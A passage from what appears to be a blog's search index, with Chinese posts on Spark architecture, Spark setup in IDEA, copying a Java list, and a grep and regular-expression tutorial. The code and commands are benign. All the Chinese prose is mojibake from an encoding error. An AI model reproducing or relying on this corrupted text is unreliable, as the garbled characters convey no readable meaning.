title="ç‰©ç†æ‰§è¡Œå±‚"></a>ç‰©ç†æ‰§è¡Œå±‚</h3><ul><li><strong>è¿™ä¸€å±‚å°±æ˜¯è´Ÿè´£å¯åŠ¨task</strong></li><li><strong>åœ¨Sparkä¸­ä¸€ä¸ªä½œä¸šæœ‰å¾ˆå¤šé˜¶æ®µ(stage)ï¼Œæ¯ä¸ªstageåŒ…å«å¾ˆå¤štaskï¼Œæ¯ä¸ªtaskåˆå¯¹åº”ä¸€ä¸ªJVMçš„çš„çº¿ç¨‹ï¼Œä¸€ä¸ªJVMå¯ä»¥åŒæ—¶è¿è¡Œå¤šä¸ªtaskï¼Œæ‰€ä»¥ä¸€ä¸ªJVMçš„å†…å­˜ç©ºé—´ç”±å¤šä¸ªtaskå…±äº«</strong></li></ul><h2 id="ä¸‹é¢ä»‹ç»Sparkçš„Standaloneæ¨¡å¼çš„ç³»ç»Ÿæ¶æ„"><a href="#ä¸‹é¢ä»‹ç»Sparkçš„Standaloneæ¨¡å¼çš„ç³»ç»Ÿæ¶æ„" class="headerlink" title="ä¸‹é¢ä»‹ç»Sparkçš„Standaloneæ¨¡å¼çš„ç³»ç»Ÿæ¶æ„"></a>ä¸‹é¢ä»‹ç»Sparkçš„Standaloneæ¨¡å¼çš„ç³»ç»Ÿæ¶æ„</h2><p><img src="https://snowgo.top/medias/medias/%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84/5.png"></p><ul><li><strong>ä¸Šå›¾æ‰€ç¤ºå³ä¸ºStandaloneæ¨¡å¼æ¶æ„å›¾ï¼Œä¸‹é¢å°†è¯¦ç»†ä»‹ç»</strong></li><li><strong>é¦–å…ˆéœ€è¦äº†è§£å‡ ä¸ªæ¦‚å¿µï¼š</strong><ul><li><strong>MasterNodeï¼šè¯¥èŠ‚ç‚¹ä¸Šå¸¸é©»Masterè¿›ç¨‹ï¼Œè´Ÿè´£ç®¡ç†å…¨éƒ¨WorkerNode</strong></li><li><strong>WorkerNodeï¼šè¯¥èŠ‚ç‚¹ä¸Šå¸¸é©»Workerè¿›ç¨‹ï¼Œè´Ÿè´£ç®¡ç†æ‰§è¡ŒSparkä»»åŠ¡</strong></li><li><strong>Sparkä½œä¸šï¼šå°±æ˜¯ä¸€ä¸ªSparkç¨‹åºï¼Œä¾‹å¦‚WordCount.scala</strong></li><li><strong>Driveè¿›ç¨‹ï¼šå°±æ˜¯è¿è¡ŒSparkç¨‹åºä¸­main()å‡½æ•°çš„è¿›ç¨‹</strong></li><li><strong>Executorï¼šå°±æ˜¯Sparkè®¡ç®—èµ„æºçš„ä¸€ä¸ªå•ä½ï¼Œç”¨è¿™ä¸ªå•ä½æ¥å ç”¨é›†ç¾¤èµ„æºï¼Œç„¶ååˆ†é…å…·ä½“çš„taskç»™Executorã€‚åœ¨Standaloneæ¨¡å¼ä¸­ï¼Œå¯åŠ¨Executorå®é™…ä¸Šæ˜¯å¯åŠ¨å›¾ä¸­çš„CoarseGrainedExecutorBackendçš„JVMè¿›ç¨‹</strong></li><li><strong>Taskï¼šDriveråœ¨è¿è¡Œmain()å‡½æ•°æ—¶ï¼Œä¼šæŠŠä¸€ä¸ªä½œä¸šæ‹†æˆå¤šä¸ªtaskï¼Œä»¥çº¿ç¨‹æ–¹å¼åœ¨Executoræ‰§è¡Œå¦‚mapç®—å­ã€reduceç®—å­ã€‚æ¯ä¸ªExecutorå…·æœ‰å¤šå°‘ä¸ªcpuå°±å¯ä»¥è¿è¡Œå¤šå°‘ä¸ªtaskï¼Œå¦‚å›¾ä¸­å…«ä¸ªcpuä¸¤ä¸ªExecutorï¼Œæ•…æ¯ä¸ªExecutorå¯ä»¥å¹¶è¡Œè¿è¡Œ4ä¸ªtask</strong></li></ul></li><li><strong>ç„¶åä»‹ç»ä¸€ä¸‹æµç¨‹ï¼š</strong><ol><li><strong>å¯åŠ¨Sparké›†ç¾¤æ—¶ï¼ŒMasterèŠ‚ç‚¹ä¼šå¯åŠ¨Masterè¿›ç¨‹ï¼ŒWorkerèŠ‚ç‚¹ä¸Šå¯åŠ¨Workerè¿›ç¨‹</strong></li><li><strong>æ¥ä¸‹æ¥å°±æäº¤ä½œä¸šç»™MasterèŠ‚ç‚¹ï¼ŒMasterèŠ‚ç‚¹ä¼šé€šçŸ¥WorkerèŠ‚ç‚¹å¯åŠ¨Executor</strong></li><li><strong>åˆ†é…taskåˆ°Executorä¸Šæ‰§è¡Œï¼Œæ¯ä¸ªExecutorå¯ä»¥æ‰§è¡Œå¤šä¸ªtaskï¼Œæ¯ä¸ªtaskå¯åŠ¨ä¸€ä¸ªçº¿ç¨‹æ¥æ‰§è¡Œ</strong></li></ol></li><li><strong>è¿˜æœ‰ä¸€äº›ç»†èŠ‚ï¼š</strong><ul><li><strong>Workerè¿›ç¨‹ä¸Šæœ‰ä¸€ä¸ªæˆ–å¤šä¸ªExecutorRunnerå¯¹è±¡ï¼Œæ¯ä¸ªå¯¹è±¡å¯ä»¥æ§åˆ¶ä¸€ä¸ªCoarseGrainedExecutorBackendè¿›ç¨‹çš„å¯åŠ¨å’Œå…³é—­</strong></li></ul></li></ul><h2 id="æ€è€ƒé¢˜"><a href="#æ€è€ƒé¢˜" class="headerlink" title="æ€è€ƒé¢˜"></a>æ€è€ƒé¢˜</h2><h3 id="â€‹Spark-çš„è¿è¡Œæµç¨‹ï¼Ÿ"><a href="#â€‹Spark-çš„è¿è¡Œæµç¨‹ï¼Ÿ" class="headerlink" title="â€‹Spark çš„è¿è¡Œæµç¨‹ï¼Ÿ"></a>â€‹Spark çš„è¿è¡Œæµç¨‹ï¼Ÿ</h3><p><img src="https://snowgo.top/medias/medias/%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84/6.png"><br>å…·ä½“è¿è¡Œæµç¨‹å¦‚ä¸‹: </p><ol><li>SparkContext å‘èµ„æºç®¡ç†å™¨æ³¨å†Œå¹¶å‘èµ„æºç®¡ç†å™¨ç”³è¯·è¿è¡ŒExecutor</li><li>èµ„æºç®¡ç†å™¨åˆ†é… Executor,ç„¶åèµ„æºç®¡ç†å™¨å¯åŠ¨Executor </li><li> Executor å‘é€å¿ƒè·³è‡³èµ„æºç®¡ç†å™¨ </li><li>SparkContext æ„å»º DAG æœ‰å‘æ— ç¯å›¾ </li><li>å°†DAGåˆ†è§£æˆ Stage (TaskSet) </li><li>æŠŠ Stage å‘é€ç»™ TaskScheduler </li><li>Executor å‘ SparkContext ç”³è¯· Task </li><li>TaskScheduler å°† Task å‘é€ç»™ Executor è¿è¡Œ </li><li>åŒæ—¶ SparkContext å°†åº”ç”¨ç¨‹åºä»£ç å‘æ”¾ç»™Executor </li><li>Task åœ¨ Executor ä¸Šè¿è¡Œ,è¿è¡Œå®Œæ¯•é‡Šæ”¾æ‰€æœ‰èµ„æº</li></ol><h3 id="â€‹Spark-æœ‰å“ªäº›ç»„ä»¶ï¼Ÿ"><a href="#â€‹Spark-æœ‰å“ªäº›ç»„ä»¶ï¼Ÿ" class="headerlink" title="â€‹Spark æœ‰å“ªäº›ç»„ä»¶ï¼Ÿ"></a>â€‹Spark æœ‰å“ªäº›ç»„ä»¶ï¼Ÿ</h3><ul><li>masterï¼šç®¡ç†é›†ç¾¤å’ŒèŠ‚ç‚¹ï¼Œä¸å‚ä¸è®¡ç®—</li><li>workerï¼š è®¡ç®—èŠ‚ç‚¹ï¼Œè¿›ç¨‹æœ¬èº«ä¸å‚ä¸è®¡ç®—ï¼Œå’Œ master æ±‡æŠ¥</li><li>Driverï¼šè¿è¡Œç¨‹åºçš„ main æ–¹æ³•ï¼Œåˆ›å»º spark context å¯¹è±¡</li><li>spark context:æ§åˆ¶æ•´ä¸ª application çš„ç”Ÿå‘½å‘¨æœŸ,åŒ…æ‹¬ dagsheduler å’Œ task scheduler ç­‰ç»„ä»¶</li><li>client: ç”¨æˆ·æäº¤ç¨‹åºçš„å…¥å£.</li></ul>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯æ ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> spark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é…ç½®sparkå¼€å‘ç¯å¢ƒ</title>
      <link href="/2022/02/16/%E9%85%8D%E7%BD%AEspark%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/"/>
      <url>/2022/02/16/%E9%85%8D%E7%BD%AEspark%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<h2 id="å¦‚ä½•åœ¨IDEAä¸­é…ç½®Sparkå¼€å‘ç¯å¢ƒï¼Ÿ"><a href="#å¦‚ä½•åœ¨IDEAä¸­é…ç½®Sparkå¼€å‘ç¯å¢ƒï¼Ÿ" class="headerlink" title="å¦‚ä½•åœ¨IDEAä¸­é…ç½®Sparkå¼€å‘ç¯å¢ƒï¼Ÿ"></a>å¦‚ä½•åœ¨IDEAä¸­é…ç½®Sparkå¼€å‘ç¯å¢ƒï¼Ÿ</h2><ol><li><strong>é¦–å…ˆè‡ªè¡Œä¸‹è½½scalaï¼Œå¹¶åœ¨IDEAä¸­åŠ å…¥scalaçš„SDKï¼Œå› ä¸ºspark2.4.3ä¾èµ–scala2.11ï¼Œæ•…è¿™é‡Œä¸‹è½½scala2.11.11</strong></li></ol><p>[<img src="https://snowgo.top/medias/medias/%E9%85%8D%E7%BD%AEspark%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/0.png"></p><ol><li><strong>å¹¶åœ¨pom.xmlä¸­æ·»åŠ spark2.4.3çš„ä¾èµ–</strong><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-core_2.11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯æ ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> spark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaåŠ¨æ€æ•°ç»„æ·»åŠ å¦ä¸€ä¸ªåŠ¨æ€æ•°ç»„</title>
      <link href="/2022/02/12/java%E5%8A%A8%E6%80%81%E6%95%B0%E7%BB%84%E6%B7%BB%E5%8A%A0%E5%8F%A6%E4%B8%80%E4%B8%AA%E5%8A%A8%E6%80%81%E6%95%B0%E7%BB%84/"/>
      <url>/2022/02/12/java%E5%8A%A8%E6%80%81%E6%95%B0%E7%BB%84%E6%B7%BB%E5%8A%A0%E5%8F%A6%E4%B8%80%E4%B8%AA%E5%8A%A8%E6%80%81%E6%95%B0%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<p>ä¸‹é¢ä¸¤ç§å†™æ³•æ˜¯ç­‰ä»·çš„ï¼Œè¿™æ ·æ·»åŠ æ•°ç»„ä¸å—æ•°ç»„åç»­å˜åŠ¨çš„å½±å“ï¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ans.add(<span class="keyword">new</span> LinkedList&lt;&gt;(tmp));</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LinkedList&lt;Integer&gt; tmps = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i :tmp)</span><br><span class="line">tmps.add(i);</span><br><span class="line">ans.add(tmps);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxå°æŠ€å·§ä¹‹grep</title>
      <link href="/2022/02/10/Linux%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8Bgrep/"/>
      <url>/2022/02/10/Linux%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8Bgrep/</url>
      
        <content type="html"><![CDATA[<p><strong>ä½œä¸ºlinuxä¸­æœ€ä¸ºå¸¸ç”¨çš„ä¸‰å¤§æ–‡æœ¬ï¼ˆawkï¼Œsedï¼Œgrepï¼‰å¤„ç†å·¥å…·ä¹‹ä¸€ï¼ŒæŒæ¡å¥½å…¶ç”¨æ³•æ˜¯å¾ˆæœ‰å¿…è¦çš„ã€‚</strong><br><strong>é¦–å…ˆè°ˆä¸€ä¸‹grepå‘½ä»¤çš„å¸¸ç”¨æ ¼å¼ä¸ºï¼šgrep  [é€‰é¡¹]  â€˜æ¨¡å¼â€™  [æ–‡ä»¶]</strong><br><strong>grepå®¶æ—æ€»å…±æœ‰ä¸‰ä¸ªï¼šgrepï¼Œegrepï¼Œfgrepã€‚</strong></p><h2 id="å¸¸ç”¨é€‰é¡¹ï¼š"><a href="#å¸¸ç”¨é€‰é¡¹ï¼š" class="headerlink" title="å¸¸ç”¨é€‰é¡¹ï¼š"></a>å¸¸ç”¨é€‰é¡¹ï¼š</h2><p><strong>-E ï¼šå¼€å¯æ‰©å±•ï¼ˆExtendï¼‰çš„æ­£åˆ™è¡¨è¾¾å¼ã€‚</strong><br><strong>-i ï¼šå¿½ç•¥å¤§å°å†™ï¼ˆignore caseï¼‰ã€‚</strong><br><strong>-v ï¼šåè¿‡æ¥ï¼ˆinvertï¼‰ï¼Œåªæ‰“å°æ²¡æœ‰åŒ¹é…çš„ï¼Œè€ŒåŒ¹é…çš„åè€Œä¸æ‰“å°ã€‚</strong><br><strong>-n ï¼šæ˜¾ç¤ºè¡Œå·</strong><br><strong>-w ï¼šè¢«åŒ¹é…çš„æ–‡æœ¬åªèƒ½æ˜¯å•è¯ï¼Œè€Œä¸èƒ½æ˜¯å•è¯ä¸­çš„æŸä¸€éƒ¨åˆ†ï¼Œå¦‚æ–‡æœ¬ä¸­æœ‰likerï¼Œè€Œæˆ‘æœå¯»çš„åªæ˜¯likeï¼Œå°±å¯ä»¥ä½¿ç”¨-wé€‰é¡¹æ¥é¿å…åŒ¹é…liker</strong><br><strong>-c ï¼šæ˜¾ç¤ºæ€»å…±æœ‰å¤šå°‘è¡Œè¢«åŒ¹é…åˆ°äº†ï¼Œè€Œä¸æ˜¯æ˜¾ç¤ºè¢«åŒ¹é…åˆ°çš„å†…å®¹ï¼Œæ³¨æ„å¦‚æœåŒæ—¶ä½¿ç”¨-cvé€‰é¡¹æ˜¯æ˜¾ç¤ºæœ‰å¤šå°‘è¡Œæ²¡æœ‰è¢«åŒ¹é…åˆ°ã€‚</strong><br><strong>-o ï¼šåªæ˜¾ç¤ºè¢«æ¨¡å¼åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²ã€‚</strong><br><strong>â€“color :å°†åŒ¹é…åˆ°çš„å†…å®¹ä»¥é¢œè‰²é«˜äº®æ˜¾ç¤ºã€‚</strong><br><strong>-A  nï¼šæ˜¾ç¤ºåŒ¹é…åˆ°çš„å­—ç¬¦ä¸²æ‰€åœ¨çš„è¡ŒåŠå…¶ånè¡Œï¼Œafter</strong><br><strong>-B  nï¼šæ˜¾ç¤ºåŒ¹é…åˆ°çš„å­—ç¬¦ä¸²æ‰€åœ¨çš„è¡ŒåŠå…¶å‰nè¡Œï¼Œbefore</strong><br><strong>-C  nï¼šæ˜¾ç¤ºåŒ¹é…åˆ°çš„å­—ç¬¦ä¸²æ‰€åœ¨çš„è¡ŒåŠå…¶å‰åå„nè¡Œï¼Œcontext</strong><br><strong>â€‹</strong><img src="https://snowgo.top/medias/medias/Linux%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8Bgrep/0.png"><br><strong>â€‹</strong><img src="https://snowgo.top/medias/medias/Linux%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8Bgrep/1.png"><br><strong>â€‹</strong></p><p><strong>â€‹</strong></p><h2 id="æ¨¡å¼éƒ¨åˆ†ï¼š"><a href="#æ¨¡å¼éƒ¨åˆ†ï¼š" class="headerlink" title="æ¨¡å¼éƒ¨åˆ†ï¼š"></a>æ¨¡å¼éƒ¨åˆ†ï¼š</h2><p><strong>1ã€ç›´æ¥è¾“å…¥è¦åŒ¹é…çš„å­—ç¬¦ä¸²ï¼Œè¿™ä¸ªå¯ä»¥ç”¨fgrepï¼ˆfast grepï¼‰ä»£æ›¿æ¥æé«˜æŸ¥æ‰¾é€Ÿåº¦ï¼Œæ¯”å¦‚æˆ‘è¦åŒ¹é…ä¸€ä¸‹hello.cæ–‡ä»¶ä¸­printfçš„ä¸ªæ•°ï¼šfgrep  -c  â€œprintfâ€  hello.c</strong><br><strong>2ã€ä½¿ç”¨åŸºæœ¬æ­£åˆ™è¡¨è¾¾å¼ï¼Œä¸‹é¢è°ˆå…³äºåŸºæœ¬æ­£åˆ™è¡¨è¾¾å¼çš„ä½¿ç”¨ï¼š</strong><br><strong>åŒ¹é…å­—ç¬¦ï¼š</strong><br><strong>. ï¼šä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚</strong><br><strong>[abc] ï¼šè¡¨ç¤ºåŒ¹é…ä¸€ä¸ªå­—ç¬¦ï¼Œè¿™ä¸ªå­—ç¬¦å¿…é¡»æ˜¯abcä¸­çš„ä¸€ä¸ªã€‚</strong><br><strong>[a-zA-Z] ï¼šè¡¨ç¤ºåŒ¹é…ä¸€ä¸ªå­—ç¬¦ï¼Œè¿™ä¸ªå­—ç¬¦å¿…é¡»æ˜¯a-zæˆ–A-Zè¿™52ä¸ªå­—æ¯ä¸­çš„ä¸€ä¸ªã€‚</strong><br><strong>[^123] ï¼šåŒ¹é…ä¸€ä¸ªå­—ç¬¦ï¼Œè¿™ä¸ªå­—ç¬¦æ˜¯é™¤äº†1ã€2ã€3ä»¥å¤–çš„æ‰€æœ‰å­—ç¬¦ã€‚</strong><br><strong>å¯¹äºä¸€äº›å¸¸ç”¨çš„å­—ç¬¦é›†ï¼Œç³»ç»Ÿåšäº†å®šä¹‰ï¼š</strong><br><strong>[A-Za-z] ç­‰ä»·äº [[:alpha:]]</strong><br><strong>[0-9] ç­‰ä»·äº [[:digit:]]</strong><br><strong>[A-Za-z0-9] ç­‰ä»·äº [[:alnum:]]</strong><br><strong>tab,space ç­‰ç©ºç™½å­—ç¬¦ [[:space:]]</strong><br><strong>[A-Z] ç­‰ä»·äº [[:upper:]]</strong><br><strong>[a-z] ç­‰ä»·äº [[:lower:]]</strong><br><strong>æ ‡ç‚¹ç¬¦å· [[:punct:]]</strong><br><img src="https://snowgo.top/medias/medias/Linux%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8Bgrep/2.png"><br><strong>â€‹</strong></p><p><strong>â€‹</strong></p><p><strong>åŒ¹é…æ¬¡æ•°ï¼š</strong><br>**{m,n} ï¼šåŒ¹é…å…¶å‰é¢å‡ºç°çš„å­—ç¬¦è‡³å°‘mæ¬¡ï¼Œè‡³å¤šnæ¬¡ã€‚<br>? ï¼šåŒ¹é…å…¶å‰é¢å‡ºç°çš„å†…å®¹0æ¬¡æˆ–1æ¬¡ï¼Œç­‰ä»·äº{0,1}ã€‚</p><ul><li>ï¼šåŒ¹é…å…¶å‰é¢å‡ºç°çš„å†…å®¹ä»»æ„æ¬¡ï¼Œç­‰ä»·äº{0,}ï¼Œæ‰€ä»¥ â€œ.<em>â€œ è¡¨è¿°ä»»æ„å­—ç¬¦ä»»æ„æ¬¡ï¼Œå³æ— è®ºä»€ä¹ˆå†…å®¹å…¨éƒ¨åŒ¹é…ã€‚</em>*<br><img src="https://snowgo.top/medias/medias/Linux%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8Bgrep/3.png"></li><li><em>â€‹</em>*</li></ul><p><strong>â€‹</strong></p><p><strong>â€‹</strong></p><p><strong>ä½ç½®é”šå®šï¼š</strong><br><strong>^ ï¼šé”šå®šè¡Œé¦–</strong><br><strong>$ ï¼šé”šå®šè¡Œå°¾ã€‚æŠ€å·§ï¼šâ€^$â€ç”¨äºåŒ¹é…ç©ºç™½è¡Œã€‚</strong><br><strong>\bæˆ–&lt;ï¼šé”šå®šå•è¯çš„è¯é¦–ã€‚å¦‚â€\blikeâ€ä¸ä¼šåŒ¹é…alikeï¼Œä½†æ˜¯ä¼šåŒ¹é…liker**<br>**\bæˆ–&gt;ï¼šé”šå®šå•è¯çš„è¯å°¾ã€‚å¦‚â€\blike\bâ€ä¸ä¼šåŒ¹é…alikeå’Œlikerï¼Œåªä¼šåŒ¹é…like</strong><br><strong>\B ï¼šä¸\bä½œç”¨ç›¸åã€‚</strong><br><img src="https://snowgo.top/medias/medias/Linux%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8Bgrep/4.png"><br><img src="https://snowgo.top/medias/medias/Linux%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8Bgrep/5.png"><br><strong>â€‹</strong></p><p><strong>â€‹</strong></p><p><strong>åˆ†ç»„åŠå¼•ç”¨ï¼š</strong><br><strong>(string) ï¼šå°†stringä½œä¸ºä¸€ä¸ªæ•´ä½“æ–¹ä¾¿åé¢å¼•ç”¨</strong><br><strong>\1 ï¼šå¼•ç”¨ç¬¬1ä¸ªå·¦æ‹¬å·åŠå…¶å¯¹åº”çš„å³æ‹¬å·æ‰€åŒ¹é…çš„å†…å®¹ã€‚</strong><br><strong>\2 ï¼šå¼•ç”¨ç¬¬2ä¸ªå·¦æ‹¬å·åŠå…¶å¯¹åº”çš„å³æ‹¬å·æ‰€åŒ¹é…çš„å†…å®¹ã€‚</strong><br><strong>\n ï¼šå¼•ç”¨ç¬¬nä¸ªå·¦æ‹¬å·åŠå…¶å¯¹åº”çš„å³æ‹¬å·æ‰€åŒ¹é…çš„å†…å®¹ã€‚</strong><br><img src="https://snowgo.top/medias/medias/Linux%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8Bgrep/6.png"><br><strong>â€‹</strong></p><p><strong>â€‹</strong></p><p><strong>3ã€æ‰©å±•çš„ï¼ˆExtendï¼‰æ­£åˆ™è¡¨è¾¾å¼ï¼ˆæ³¨æ„è¦ä½¿ç”¨æ‰©å±•çš„æ­£åˆ™è¡¨è¾¾å¼è¦åŠ -Eé€‰é¡¹ï¼Œæˆ–è€…ç›´æ¥ä½¿ç”¨egrepï¼‰ï¼š</strong><br><strong>åŒ¹é…å­—ç¬¦ï¼šè¿™éƒ¨åˆ†å’ŒåŸºæœ¬æ­£åˆ™è¡¨è¾¾å¼ä¸€æ ·</strong><br><strong>â€‹</strong></p><p><strong>åŒ¹é…æ¬¡æ•°ï¼š</strong><br>*** ï¼šå’ŒåŸºæœ¬æ­£åˆ™è¡¨è¾¾å¼ä¸€æ ·**<br><strong>? ï¼šåŸºæœ¬æ­£åˆ™è¡¨è¾¾å¼æ˜¯?ï¼ŒäºŒè¿™é‡Œæ²¡æœ‰\ã€‚</strong><br><strong>{m,n} ï¼šç›¸æ¯”åŸºæœ¬æ­£åˆ™è¡¨è¾¾å¼ä¹Ÿæ˜¯æ²¡æœ‰äº†\ã€‚</strong><br><strong>+ ï¼šåŒ¹é…å…¶å‰é¢çš„å­—ç¬¦è‡³å°‘ä¸€æ¬¡ï¼Œç›¸å½“äº{1,}ã€‚</strong><br><strong>â€‹</strong></p><p><strong>ä½ç½®é”šå®šï¼šå’ŒåŸºæœ¬æ­£åˆ™è¡¨è¾¾å¼ä¸€æ ·ã€‚</strong><br><strong>â€‹</strong></p><p><strong>åˆ†ç»„åŠå¼•ç”¨ï¼š</strong><br><strong>(string) ï¼šç›¸æ¯”åŸºæœ¬æ­£åˆ™è¡¨è¾¾å¼ä¹Ÿæ˜¯æ²¡æœ‰äº†\ã€‚</strong><br><strong>\1 ï¼šå¼•ç”¨éƒ¨åˆ†å’ŒåŸºæœ¬æ­£åˆ™è¡¨è¾¾å¼ä¸€æ ·ã€‚</strong><br><strong>\n ï¼šå¼•ç”¨éƒ¨åˆ†å’ŒåŸºæœ¬æ­£åˆ™è¡¨è¾¾å¼ä¸€æ ·ã€‚</strong><br><strong>â€‹</strong></p><p><strong>æˆ–è€…ï¼š</strong><br><strong>a|b ï¼šåŒ¹é…aæˆ–bï¼Œæ³¨æ„aæ˜¯æŒ‡ | çš„å·¦è¾¹çš„æ•´ä½“ï¼Œbä¹ŸåŒç†ã€‚æ¯”å¦‚ C|cat è¡¨ç¤ºçš„æ˜¯ Cæˆ–catï¼Œè€Œä¸æ˜¯Catæˆ–catï¼Œå¦‚æœè¦è¡¨ç¤ºCatæˆ–catï¼Œåˆ™åº”è¯¥å†™ä¸º (C|c)at ã€‚è®°ä½(string)é™¤äº†ç”¨äºå¼•ç”¨è¿˜ç”¨äºåˆ†ç»„ã€‚</strong><br><strong>â€‹</strong></p><p><strong>æ³¨1ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼Œæ­£åˆ™è¡¨è¾¾å¼çš„åŒ¹é…å·¥ä½œåœ¨è´ªå©ªæ¨¡å¼ä¸‹ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒä¼šå°½å¯èƒ½é•¿åœ°å»åŒ¹é…ï¼Œæ¯”å¦‚æŸä¸€è¡Œæœ‰å­—ç¬¦ä¸² abacbï¼Œå¦‚æœæœç´¢å†…å®¹ä¸º â€œa.<em>bâ€ é‚£ä¹ˆä¼šç›´æ¥åŒ¹é… abacbè¿™ä¸ªä¸²ï¼Œè€Œä¸ä¼šåªåŒ¹é…abæˆ–acbã€‚</em>*<br>*<em>æ³¨2ï¼šæ‰€æœ‰çš„æ­£åˆ™å­—ç¬¦ï¼Œå¦‚ [ ã€</em> ã€( ç­‰ï¼Œè‹¥è¦æœç´¢ * ï¼Œè€Œä¸æ˜¯æƒ³æŠŠ * è§£é‡Šä¸ºé‡å¤å…ˆå‰å­—ç¬¦ä»»æ„æ¬¡ï¼Œå¯ä»¥ä½¿ç”¨ * æ¥è½¬ä¹‰ã€‚</strong><br><strong>â€‹</strong></p><p><strong>ä¸‹é¢ç”¨ä¸€ä¸ªç»ƒä¹ æ¥ç»“æŸæœ¬æ¬¡grepçš„å­¦ä¹ ï¼š</strong><br><strong>åœ¨ç½‘ç»œé…ç½®æ–‡ä»¶ /etc/sysconfig/network-scripts/ifcfg-ens33 ä¸­æ£€ç´¢å‡ºæ‰€æœ‰çš„ IP</strong><br><strong>1ã€æ£€ç´¢å‡º 0-255çš„èŒƒå›´</strong><br><img src="https://snowgo.top/medias/medias/Linux%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8Bgrep/7.png"><br><strong>2ã€ç”±0-255çš„æ•°å­—ç»„åˆæˆIP</strong><br><img src="https://snowgo.top/medias/medias/Linux%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8Bgrep/8.png"><br><strong>3ã€ç®€åŒ–</strong><br><img src="https://snowgo.top/medias/medias/Linux%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8Bgrep/9.png"></p><h2 id="é™„ï¼šé…åˆlsä½¿ç”¨"><a href="#é™„ï¼šé…åˆlsä½¿ç”¨" class="headerlink" title="é™„ï¼šé…åˆlsä½¿ç”¨"></a>é™„ï¼šé…åˆlsä½¿ç”¨</h2><p>åªåˆ—å‡ºå­ç›®å½•</p><ol><li>ls -F | grep /$ æˆ–è€… alias sub = â€œls -F | grep /$â€(linux)</li><li>ls -l | grep â€œ^dâ€ æˆ–è€… ls -lL | grep â€œ^dâ€ (Solaris)<br>è®¡ç®—å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶æ•°å’Œç›®å½•æ•°<br>ä¸‹é¢å‘½ä»¤å¯ä»¥åˆ†åˆ«è®¡ç®—å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶å’Œç›®å½•ä¸ªæ•°ï¼š<h1 id="ls-l-grep-â€œ-â€œ-wc-l-â€”-to-count-files"><a href="#ls-l-grep-â€œ-â€œ-wc-l-â€”-to-count-files" class="headerlink" title="ls -l * |grep â€œ^-â€œ|wc -l â€”- to count files"></a>ls -l * |grep â€œ^-â€œ|wc -l â€”- to count files</h1><h1 id="ls-l-grep-â€œ-dâ€-wc-l-â€”â€“-to-count-dir"><a href="#ls-l-grep-â€œ-dâ€-wc-l-â€”â€“-to-count-dir" class="headerlink" title="ls -l * |grep â€œ^dâ€|wc -l â€”â€“ to count dir"></a>ls -l * |grep â€œ^dâ€|wc -l â€”â€“ to count dir</h1><blockquote><p>å‚è€ƒèµ„æ–™ï¼š<a href="https://www.cnblogs.com/flyor/p/6411140.html">https://www.cnblogs.com/flyor/p/6411140.html</a></p></blockquote></li></ol>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
